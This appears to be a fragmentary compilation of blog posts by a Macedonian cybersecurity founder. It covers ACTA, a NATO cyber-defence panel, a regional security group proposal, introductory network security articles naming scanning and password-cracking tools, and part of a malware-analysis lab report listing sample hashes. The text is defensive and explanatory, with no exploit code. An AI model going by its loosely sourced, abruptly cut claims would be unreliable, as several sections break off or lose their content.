examples and in the Figure 1 we have illustrated you with the map of
digital divide.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;ACTA: Anti-Counterfeiting Trade Agreement&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Anti-Counterfeiting Trade Agreement has been negotiated from 2007
through 2010 by the United states, the European Union, Switzerland,
Canada, Australia, New Zealand, Mexico, Singapore, Morocco, Japan and
South Korea. And it has been signed 8 of 11 agreements in October 2011.
Moreover, in October 2012 it was ratifies by Japan as well [8]. In
addition in Figure 2 we have illustrated you the map of ACTA countries
involved in drafting the convention.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Why should you care?&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;When we look over the both maps we can come to conclusion that the
strongest countries that has less digital divide is the ones who has
drafted the convention of ACTA. So we should care, because of the
process how it was negotiated, indeed in secret. And the first text was
officially released in 2010. It has been roundup within eight
closed-doors negotiations. As well as the provisions, where the new IP
enforcement measures that raise potential concerns for users free
speech, privacy, ability to innovate and due process rights. And
finally, the enforcement it creates a new ad-hoc institution, an “ACTA
Committee”, constituting non-elected members to oversee ACTA
implementation and interpretation with no legal obligation to the
transparent in their proceedings [8].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Digital divide vs ACTA&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Anyhow, when we compare digital divide versus ACTA agreement we can see
that they overlap into one opposite directions. Such as explained in the
below table:&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;

&lt;/p&gt;
&lt;p&gt;
&lt;/table&gt;

&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In short summary is we have introduced the reader with the terminology
of what is digital divide coupled with examples. As well as the linked
connection between the two topics, digital divide versus ACTA agreement.
Therefore, we come to the conclusion is that indeed the ACTA convention
is bullying the digital divide.&lt;/p&gt;
&lt;/p&gt;

by &lt;a href="http://www.paneuropa.bg/" title="PanEuropa Bulgaria"&gt;PanEuropa Bulgaria&lt;/a&gt; and
it was supported by NATO. Furthermore, I was invited to take a
participation as a speaker on the panel discussion Collective Cyber
Defence – The Role of Newer Members and Opportunities for Specialization
of Bulgaria in the Alliance Questions and answers. In details, the event
main points ware to highlight the need for specialization of each member
state in terms of the principles of Smart Defense and the joint
participation in future military operations.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the event had splendid video addressing in the opening session
of Neelie Kroes, the Vice – President of European Commission.
Emphasizing the current online spying crisis as well as the importance
of cyber security strategy. In additional, she highlighted the
importance of new legal threats, information norms coupled to boost the
trust among the Europe. As well as, that the weakest link in the chain
should be able to raise and boost the awareness, coupled with the future
investments in research and innovations, and projects.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Regarding the collective cyber defense panel discussion, I was delighted
to be speaker with such strong extensive and experienced experts from
different fields. Such as private, public, academy and business sectors.
Speaking of which, the moderator of the panel was Prof. Veselin Tselkov,
D. Sc., Member of the Board, Commission for Personal Data Protection in
Bulgaria. The lectures where: unfortunately Col. Associate Prof. Dr.
Stoyan Balabanov, Director, Institute for Defense, Ministry of Defense
Bulgaria, was not able to attend the panel, however we had
representative from MoD. Also from Bulgaria was Zlatogor Minchev from
Institute of Information and Communication Technologies, Bulgaria. From
Macedonian was Dr. Metodi Hadji-Janev (LtC), Assistant Prof., Military
Academy ” General Mihailo Apostolski”, Skopje, Macedonia. From business
prospective I was the presenter of
&lt;a href="http://cybersecurity.mk" title="CyberSecurity.mk"&gt;CyberSecurity.mk&lt;/a&gt; copmany,
based in Macedonia. In addition, Mr. Robert Griffin, Director Business
Development – Security Systems, RSA. From all the above, we also had
video addressing from Mr. Detlef Puhl, Senior Advisor at the Emerging
Security Challenges Division, NATO Headquarters, and Mr. Philippe
Roggeband, Security Sales Business Development Manager, EBG EMEAR, Cisco
Systems. However, due to the security measures in the building where the
event was held the video addressing was interrupted.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, here is my short presentation notes.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;/p&gt;

&lt;p&gt;Cyberspace has become one of the most essential and distinguished
bridge between government and their inhabitants. Thus, the people are
able to get access to government services 24/7, as well as their life
becomes more easier. However, all in this has led to advance of
producing cyberspace to be vulnerable, coupled with information’s that
should not be available to others. For this reason I would like to
share three important points that are fundamental to emphasis when we
discuss about the Cyber defense in general. First, we have to
understand and highlight the difference between Cyber Security vs IT
Security. Second, it is the important to boost the awareness level
tailored to national level, social society, private sector and indeed
multistakeholder cooperation in the region. Last but not least, we
have to brake the lack of communications between the neighboring
countries and to create a trusted, same level, and collaboration of
cyber security. Where national agencies and parties should work
together.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Without further ado, first the main goal of IT security is to protect
information from a wide range of threats in order to ensure business
continuity, reduce business damages and maximize return on investments
and business opportunity. Likewise the cyber security is protecting
Information and Communication Technologies (ICT) systems and Critical
Infrastructure (CI). However the most important protection element in
IT security is to reduce business risk to accepted levels and the
protection of entire information and information systems essential to
the organizations. Alternatively, cyber security aims at assuring
critical IT service for CI and CII on accepted levels, in addition to
the protection of critical information. In other words the security
objective determiner in information security is an organization’s
business process, while in cyber security it is for the entire state.
Emphasizing that states may have different or complementary interests
compared to an organization’s business interests. On one hand,
handling cyber security problems is considered to be both a nationally
and internationally coordinated activity to protect national CII.
Similarly, to information security goals: confidentiality,
availability and integrity, in cyber security the additional goals are
non-repudiation, authentication, information systems importance and
criticality from the standpoint of state CII/CI.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to awareness, I would like to share my recent research that
have been published as book, title: Interactive Cyber Security
Awareness Program. It is highlighting the method, approach and the
importance of current awareness level in Western Balkans. Coupled how
to boost the awareness on the national level. I would not like to go
in details, however, just want to mention that the positive results
were presented, and that the awareness level among the end users are
varied. Moreover, in particular we have to create and recognize the
importance of establishing cyber security awareness strategy, coupled
with influence of the weakest link in cyber security, which is the
human factor, or in other words, social-technical aspects. In spite of
our investment in technologies and in the applications, still the
weakest link in cyber defense and security will the human behavior.
Therefore, we will have to conceive an awareness/education to raise
the awareness on the national behalf, such as, from the young to the
oldest generation, tailored through social society, private sector and
multistakeholder cooperation.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Lastly, in recent years we are witnesses of acts that have taken into
place between neighboring countries in the region. Such acts were
followed by different motivations of attacks. Where mostly they were
done through defacement’s or denial-of-service attacks. Thus,
motivations where divers. Nevertheless, in this last point is I would
like to stress the importance of merging the best practices learned
from past event occurrence as well as to improve the role of newer
members and opportunities into the collective roles of cyber defence.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/p&gt;

&lt;p&gt;In summary, I am keen that after this discussion/panel will lead into
further actions. And also thanks to the organizers for the invitation
and done a good job in organizing such an important event.&lt;/p&gt;

Firstly Obama administration get order intended to bolster
cybersecurity, where the move comes after the White House tried, and
indeed failed to get tough cybersecurity legislation through Congresses
last year. Secondly, EU released the cybersecurity plan to protect open
Internet and online freedom and opportunity – Cyber Security strategy
and Proposal for a Directive. Frankly, where are the countries of South
Eastern Europe (SEE) in here, such as the ones that are not in EU, for
instance: Macedonia, Serbia, Montenegro, Bosnia, Albania and Kosovo?&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, my plan, as a founder of
&lt;a href="http://cybersecurity.mk"&gt;Cybersecurity.mk&lt;/a&gt; would like to make a
proposal of creating and teaming a group which will meet once a month to
talk over another the importance of such as beneficial and in fact
essential cybersecurity issues, as well as to exchange knowledge.
Sharing is caring. Additionally, in every meeting we will merge and
invite important people either over the remote or in the place speakers
to give, share and offer us a knowledge what we should do in a near
future. How we could fix and raise not only the awareness, but also the
importance of cybersecurity in South Eastern Europe (Macedonia, Serbia,
Montenegro, Bosnia, Albania, Kosovo, Croatia, Slovenia, Bulgaria,
Romania and Greece).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For this proposal to be success we would need a help from NGO’s, NPO’s
and any other institutes from the region and elsewhere. In addition I
would like to ask hackers, crackers, ethical and non-ethical, designers,
freelancers and many other to help us with the following problems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Name of the group. I will be more than happy if you could give as
proposals on the comment section for the name of the group. Let us
contribute together in this matter and we will be all God Fathers for
the group which will help us in improving and boosting awareness level
in cyber and IT security in our region.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Logo. We would like to hear from any of you to design the logo of
South Eastern Europe – Cyber Security Group. Please feel free to give us
a link of the design in the comment section (below) and then we will
select together the best proposal.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sponsorship for the speakers to invite them to meet with us in face to
face, either is NGO, NPO, financial, telecommunication, insurance
institutes.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Proposal of speakers, list for the next meetings and place, indeed.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;If you have any further great ideas or proposals please do not hesitate
to share them with us. We would be more than happy to take them in
consideration. Nevertheless, I really hope that forming the group, such
as Google Developer Group etc. will help on one hand. And on the other
hand, will aid to meet one another, to discuss and share our knowledge.
To learn from the best people and scholars in cybersecurity.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Overall, more frequently in SEE region we have seen targets to attackers
on the Internet. How do we handle this matter of facts and how we deal
against? How we protect our online space? And indeed why we should take
actions? Those are just a start-up questions that everyone of us should
be able to answer them. Therefore, we hope that you all will contributes
in the above problem that we face and will HELP us in creating this
group in SEE region.&lt;/p&gt;

&lt;p&gt;A toolkit is a collection of tools, where for our motives is an assembly
of tools to eavesdropper and scan network security for the possible
exploitations. Moreover, these tools are designed from security
researchers and experts, for the purpose of network administrator and
security analysts to be able in everyday work to conduct potential
exploitations, to watch and to analyse the network. Additionally,
network monitoring is a term to describe the system that is constantly
monitoring computer network for being slow or failing peripherals, and
it notifies the network administrator either via email, SMS or alarms in
case of interruption of service. Equally to network monitoring, the
security analysts are responsible for designing and monitoring security
systems. As well as, to coordinating policies of security measures to
protect information in computer files from unauthorized or accidental
change, distribution or disclosure. It is therefore in this article we
will introduce the readers with the basic concept and essential part of
network security toolkits. As well as, already possible network security
tools to help them to conduct network security monitoring and analysing.
Lastly, we will give the readers with recommendation and conclusion.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Network Security Toolkit&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In this section we will take a look at a few essential components of the
toolkits, and their main goals and purposes. When we assemble the
toolkit, you might want to consider having at least one of the following
components included:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Packet Sniffer&lt;/strong&gt;. It is an either software or hardware piece that
can intercept and log traffic passing over the network or part over the
network. As the data flaws across the network, the sniffer is capturing
each packets and if needed it will decode the packets raw, by displaying
the values of various fields in the packet, and it will analyse the
content according the RFC or other specifications. This is especially
useful when dealing with security threats that produce abnormal packets
or enormous traffic. As well as, it will help to diagnose failed network
hardware.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Port Scanner&lt;/strong&gt;. It is software developed to probe server or host for
open ports. This kind of tools are essentially in every day work for
administrators to verify security policies of their network and to find
unwanted running services, before the attackers. They are very useful in
fact to figure and detect unauthorized systems and services. The
technique that most of the tools that are using are based upon finger
print matching technology.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Intrusion Detection System (IDS)&lt;strong&gt;&lt;em&gt;. It is a device
or application that monitors network or systems activities for malicious
hustle or policy violations and, of course produces reports to a
management staff. Moreover, typically they record information related to
observed events, let know the security administrators of observed
events, and respond to the detected threats by attempting to prevent it
from fulfil.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;/em&gt;*Log Analysers&lt;/strong&gt;. Are dealing with large volume of
computer generated log messages, known as event logs, audit records,
etc. Furthermore, it deals as well as log analysis which can be in a
real-time and in bulk after storage, also log search and last procedure
reporting. In mace cases most of the system administrators groan of
examining through log files for precious of information.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;/strong&gt;Vulnerability Scanners&lt;strong&gt;. It is an application designed
to assess computers, application, computer systems and networks for
their weaknesses. There different types of vulnerability scanners by
distinguished from one another by a focusing to particular targets. The
functionality varies among the different types of vulnerability
scanners. They share common purpose of enumerating the vulnerabilities
present in one or more targets. Also they enable you to seek out if your
network or system has known vulnerabilities for patching.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;/strong&gt;Web Scanners&lt;strong&gt;. It is a program which communicates with
web applications through the web front-end to be able to show potential
security vulnerabilities in the web application and their architectural
weaknesses. Unlike the source code scanners, web application scanners
they don’t have access to the source code, and that is why they detect
vulnerability by performing real attacks to the web application.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;/strong&gt;Password Crackers**. It is a process of either recovering
or gaining access, password from data that has been stored in or
transmitted by a computer or network. The approach is to repeatedly
trying to guess the password. As well as, they allow you to quickly scan
a host computer for accounts with weak password, one or the other by
disabling them or force their owners to carry out and create stronger
passwords.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Note that the above list is just an understandable part that you should
have in mind to consider had them into your everyday network security
toolkit box. In the next paragraph we will give the readers with the
available tools that are essential for the network security toolkits.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Available Network Security Tool&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Most of the tools listed below are open source solutions and they cover
one or more components from the above list. Additionally, for further
detail information please refer to the following link
&lt;a href="http://sectools.org/"&gt;http://sectools.org/&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For instance for password cracking you might use the &lt;a href="http://www.openwall.com/john/"&gt;John the
Ripper&lt;/a&gt; and
&lt;a href="http://project-rainbowcrack.com/"&gt;RainbowCrack&lt;/a&gt; tools. Where for packet
sniffing there is a big variety of tools, but most commonly known are:
&lt;a href="http://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;, &lt;a href="http://www.ntop.org/"&gt;Ntop&lt;/a&gt;,
&lt;a href="http://www.tcpdump.org/"&gt;Tcpdump&lt;/a&gt; and many others. Moreover, to be able
to conduct vulnerability scanning consider the following tools, such as,
&lt;a href="http://www.tenable.com/products/nessus"&gt;Nessus&lt;/a&gt;,
&lt;a href="http://www.openvas.org/"&gt;OpenVAS&lt;/a&gt;,
&lt;a href="https://www.titania-security.com"&gt;Nipper&lt;/a&gt;, etc. In addition to the
scanners, for web application the most known is a&lt;a href="http://www.portswigger.net/burp/"&gt;Burp
Suite&lt;/a&gt;, then
&lt;a href="http://www.websecurify.com/"&gt;Websecurify&lt;/a&gt;,
&lt;a href="http://cirt.net/nikto2"&gt;Nikto&lt;/a&gt; and few more. For port scan you might
want to consider &lt;a href="http://nmap.org/"&gt;Nmap&lt;/a&gt;. And finally for log analyser
to come in handy is &lt;a href="http://sourceforge.net/projects/swatch/"&gt;Swatch&lt;/a&gt;,
as well as for Intrusion Detection System handy tool is
&lt;a href="http://www.snort.org/"&gt;Snort&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The above list of tools and the list of components will help and aim to
the reader for what to have and to look at. Same as there are few of the
many pieces of software put together from the dedicated security experts
to advance the state of art of network security toolkit, such as,
&lt;a href="http://networksecuritytoolkit.org/nst/index.html"&gt;Network Security

&lt;p&gt;Currently, humans coupled with the socio-technical aspect can be either
the strongest or the weakest link in any information security system,
and the key in security lies in delivering awareness training through
short and effective online videos, whereby the participator can gain
knowledge on security. Our aim, therefore, is to develop innovative
solutions to deliver an interactive cyber security awareness program,
where the main goal is to enhance information on security awareness and
knowledge in organizations, schools, nations, homes etc. The syllabus
consists of a systematic approach divided into three sections. The
introduction is a basic level course (BASIC), with the aim of delivering
an elementary curriculum in physical security, computer and mobile;
network and Internet security to everyone. It is made up of several
units with interactive training videos that last less than 10 minutes
each. The second course (ADVANCE) is the advanced program which
demonstrates the attacking phases, different attacking methods and the
countermeasures that highlight the anatomy of Advance Persistence
Threats (APT). This curriculum is intended for administrators, help desk
personnel, information technology professionals among others. The last
course (MANAGEMENT) is intended for managers, where we annotate two
decision-making processes with their cycle loop. Moreover, after each
unit there is a questionnaire, which measures the knowledge of each
participant, and compares it to the base-line survey carried out during
the registration process. As a result, it represents the participant’s
awareness level and knowledge, and will assist in further actions if
necessary. By implementing this program in private and public
organizations, governments, schools and universities will lead to the
improvement of security in the everyday use of computers, mobile phones,
online banking, social networking_ both at home and in the workplace.
The present study addresses and implements the IT security issue. We
will apply the results by carrying out the syllabus, with the latest
improvements, in universities and private organizations. Consequently by
applying these further improvements to the syllabus, it will meet the
needs of the cyber security field.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;A computer network, or in other words simply a network, is a collection
of computers and other hardware components interconnected by
communication channels that allow sharing of data, resources and
information [1]. Adopt for both_ private or public needs, which are
used in everyday tasks to conduct transactions and communications among
individuals, business, government agencies, etc. The network consists of
nodes, which are individual user computers (client terminals), and one
or more servers and/or host computers. Which are linked by communication
systems, some of might be private, for example company, and other which
might be open to public access. Obvious example of a network system that
is open to public access is the Internet, where indeed, many private
networks utilize publicly accessible communications, as well. Nowadays
for instance, company host computers can be accessed by their employees
whether in their offices over a private communications network, or from
their homes, or while there on the road.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;It is therefore, network security involves all activities that
individuals, organizations, enterprises and institutions are undertaking
to protect their value and on-going employment of assets and the
integrity and continuity of operations. For that reason this article
will introduce the readers and end users with the history of network
security. Furthermore, with an introduction of effective network
security strategy requires and most common network attacks methods.
Please bear in mind that in fact, this article is not going to discuss
over the depth details, rather than is going to deliver you introductory
knowledge and suggestions for further perusal. And finally, we will
finalize the article within conclusion.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;History&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Securing information over a network had its roots in the late 1960s when
networks only existed in the sense of huge mainframes and multiple
networked terminals. Hundreds of thousands and millions of dumb
terminals were connected via hubs and concentrators to the huge central
processing units, spinning tapes, and rotating drives in some distant
air-conditioned, properly humidifier windowless room [2]. Without the
presence of client-server network models, sharing or multi-user,
multi-tasking processors, network security was not yet a real concern.
Network security, however, has evolved over the years due to the
increasing reliance on public networks not to disclose personal,
financial, and other restricted information [3]. Such as, there are
numerous instances Kevin Mitnick [4] and Vladimir Levin [5] cases that
prompted organizations across all industries to re-think the way they
handle information, including its transmission and disclosure. The
popularity of the Internet was one of the most important developments
that prompted an intensified effort in data security [3].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;A growing number of people are using their personal computers to gain
access to the resources that the Internet has to offer. From electronic
email, commerce transactions and research interests, the Internet has
taken place as one of the most important development of 20th century.
However, the Internet Protocol (IP) in early stage was not designed to
be secure. There were no approved securities standards build into the
Transmission Control Protocol (TCP) and IP communication stack, which
allowing it open to potentially malicious users and processes across the
network. Where modern developments have made Internet communication more
secure, yet there are still incidents that gain eminent attention and
alert us to the fact that nothing is completely safe and secure.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Where in early 2000 a different type of attacks were unleashed on
several of the most heavily trafficked site on the Internet, such as,
yahoo.com, cnn.com, amazon.com and many others. Furthermore, in 2007, a
data breach exploiting the widely known weaknesses of the Wired
Equivalent Privacy (WEP) wireless encryption protocol resulted [6].
Indefinitely all those incidents have granted billion of records and
money to end up in the behalf of the thief.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, these results enforce the reality that computer and network
security has become a quantifiable and justifiable expense for IT
budgets. Organizations that require data integrity and high availability
elicit the skills of system administrators, developers, and engineers to
ensure 24×7 reliability of their systems, services, and information.
Falling victim to malicious users, processes, or coordinated attacks is
a direct threat to the success of the organization, as well as
individual [3].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Network Security&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;System and network technology is in fact a key technology for a wide
variety of applications. Security is crucial factor to networks and
applications. Although, network security is a critical requirement in
emerging networks, there is a significant lack of security methods that
can be easily implemented [7].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;There is an existing communication gap between the developers of
security technology and developers of networks. When considering network
security, it must be emphasized that the while network is secured.
Moreover, network security does not only concern the security in the
computers at each end of communication sequence. Also when transmitting
data the communication channel should not be vulnerable to attack. A
hacker could target the communication channel, and could obtain the
data, and decrypt it and re-insert a false value. In fact, securing the
network is just as important as securing the computers.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As a result when developing a secure network, the following need to be
considered [8]:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Access – authorized users are provided the means to communicate to and
from a particular network&lt;/p&gt;
&lt;p&gt;Confidentiality – Information in the network remains private&lt;/p&gt;
&lt;p&gt;Authentication – Ensure the users of the network are who they say they
are&lt;/p&gt;
&lt;p&gt;Integrity – Ensure the message has not been modified in transit&lt;/p&gt;
&lt;p&gt;Non‐repudiation – Ensure the user does not refute that he used the
network&lt;/p&gt;
&lt;p&gt;Moreover, an effective network security plan is developed with the
understanding of security issues, potential attackers and attacking
methods, needed level of security, and factors that make a network
vulnerable to attack. The different attacking methods are followed
throughout this article endeavour.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Common Network Attacks Methods&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Whiteout implemented security measures and controls in place, your
network and data might be subjected to an attack. Some attacks for
instance could be passive, meaning that information is monitored; other
could be active, meaning the information is varying within intent to
destroy or corrupt the data or the network itself.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Likelihood your networks and data are vulnerable to any of the following
types of attacks if you do not have a security plan in place [9]:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Eavesdropping – Interception of communications by an unauthorized
    party&lt;/li&gt;
&lt;li&gt;Data Modification – Data altering, reading from unauthorized party&lt;/li&gt;
&lt;li&gt;Identity Spoofing (IP Address Spoofing) – IP address to be falsely
    assumed— identity spoofing and the attacker can modify, reroute, or
    delete your data&lt;/li&gt;
&lt;li&gt;Password-Based Attacks – By gaining your access rights to a computer
    and network resources are determined by who you are, that is, your
    user name and your password&lt;/li&gt;
&lt;li&gt;Denial-of-Service Attack – Prevents normal use of your computer or
    network by valid users, and it could be used for sending invalid
    data to application, to flood the computer, block traffic, etc.&lt;/li&gt;
&lt;li&gt;Man-in-the-Middle Attack – Is when someone between you and the
    person with whom you are communicating is actively monitoring,
    capturing, and controlling your communication transparently&lt;/li&gt;
&lt;li&gt;Application-Layer Attack – It targets application servers by
    deliberately causing a fault in a server’s operating system or
    applications and the attacker gaining the ability to bypass normal
    access controls&lt;/li&gt;
&lt;li&gt;Anyhow, this is just a most commonly known network attacks methods,
    and indeed there plenty of more.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;That is why network security is an important field that is increasingly
gaining attention as the Internet usage increases. The security threats
and Internet protocols were analysed to determine the necessary security
technology. However, the current development in network security is not
very impressive and significant.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, researchers and scholars are rapidly evolving in developing
and investigating the threats further in a future. And with this
information in mind, the process can be formalized and the path becomes
clearer as you delve deeper into the specifics of the security process,
as well.&lt;/p&gt;

&lt;p&gt;Find additional 2 online analysis tools where to analyse virus.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Things that should be presented in the laboratory report are:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;

&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Analysis tools – links&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Your opinion about each analysis tool and comparison results.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, we are going to analyse the chosen files in section Chosen
files and each file with the above required information and detail
analysis results, links to disinfecting instructions, analysis tools
used for this purpose. Secondary, expression about each analysis tool
used and comparison results will be presented in section Analysis. In
addition, in section Appendixes its provides what virtual environment
has been used for this laboratory report. Because we know that if we
open this file in our real machine we will get infected. That is why we
are using an Linux virtual environment.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, each file will be analysed with two different tools, in
case to gather more information and solution for disinfecting process.
Finally the conclusion made of all collected data will be concise in
conclusion section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CHOSEN FILES&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Number of files are listed bellow and the name of the file that is going
to be analysed:&lt;/p&gt;
&lt;p&gt;​1. Number: 71; File name: &lt;code&gt;sales.exe; Size: 454.7 KB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​2. Number: 57; File name: &lt;code&gt;mgre.exe; Size: 61.4 KB&lt;/code&gt;&lt;/p&gt;

&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;The above malware file has been reported that is capable to send out
e-mail message with the built in SMTP client engine. Second, it contains
characteristics of Waledac, a worm that spreads by sending an e-mail
containing links to copies of itself. And finally, creates a startup
registry entry.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Links provided, are demonstrating which anti virus software/application
can disinfected the malware infection.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Tools for analysing the malware are:&lt;/p&gt;
&lt;p&gt;​1. Netscty – Online Sandbox: &lt;a href="http://netscty.com/malware-tool"&gt;http://netscty.com/malware-tool&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​2. Virustotal.com – &lt;a href="http://www.virustotal.com/index.html"&gt;http://www.virustotal.com/index.html&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;FILE 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;File name: &lt;code&gt;mgre.exe; Size: 61.4 KB;&lt;/code&gt; Number: 57.&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    MD5: 1375a8e437db6acafe2b0419cfbff7ecSHA1:b48f702a5a0fa8558c278dd97ecfbd0d637fefd3SHA256: 89294d70e80547aac5b506915d2e8fc0309c0e578ab16fc9875c9a4668e63709

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Links to analyse report:&lt;/p&gt;
&lt;p&gt;​1.
&lt;a href="http://camas.comodo.com/cgi-bin/submit?%20file=89294d70e80547aac5b506915d2e8fc0309c0e578ab16fc9875c9a4668e63709"&gt;http://camas.comodo.com/cgi-bin/submit?file=89294d70e80547aac5b506915d2e8fc0309c0e578ab16fc9875c9a4668e63709&lt;/a&gt;&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;From above analysed links we can conclude that the file creates keys, it
changes values in registry, it change only one file, creates process
called sample.exe and adds value to the modules.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The links do not show any way of disinfecting the following malware
file. My personal opinion of the above links is good that they can show
you that this file is malware, but still they do not show you enough
information. Which can help you for further instructions and actions
that should be consider. Not even providing you an information or links
which anti virus software can help you.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Tools for analysing the malware are:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Comodo Instant Malware Analysis – &lt;a href="http://camas.comodo.com/"&gt;http://camas.comodo.com/&lt;/a&gt;&lt;/li&gt;

&lt;/ol&gt;
&lt;/p&gt;

&lt;h2&gt;FILE 3&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;File name: &lt;code&gt;moos3.exe; Size: 91.6 KB;&lt;/code&gt; Number: 60.&lt;/p&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Links to analyse report:&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The malware file, contains characteristics of an identified security
risk. Possible security risk is Backdoor.Agent.AJU [Backdoor.Agent.AJU].
The threat category is network-aware worm and malicious trojan horse.
Its modifying file system, memory and registry. The origin of this
malware indicates possible country, Russian Federation.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the reports we can conclude that most of the known anti virus
software has hit of this malware infection and it can disinfected.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Tools for analysing the malware are:&lt;/p&gt;
&lt;p&gt;​1. Anubis: Analyzing Unknown Binaries – &lt;a href="http://anubis.iseclab.org/"&gt;http://anubis.iseclab.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​2. ThreatExpert – &lt;a href="http://www.threatexpert.com/"&gt;http://www.threatexpert.com/&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;ANALYSIS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The web tool that we have used to analysis three of random chosen files
are listed bellow.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, we will compare each one of those service, what kind of
information they show, provide and do they supply with disinfected
solution, if so how, and why not.&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Netscty – Online Sandbox: &lt;a href="http://netscty.com/malware-tool"&gt;http://netscty.com/malware-tool&lt;/a&gt;&lt;/li&gt;

&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;To compare our results from the above list of online analysing tools I
have setup an score from 1 to 5 of each section. Where the highest score
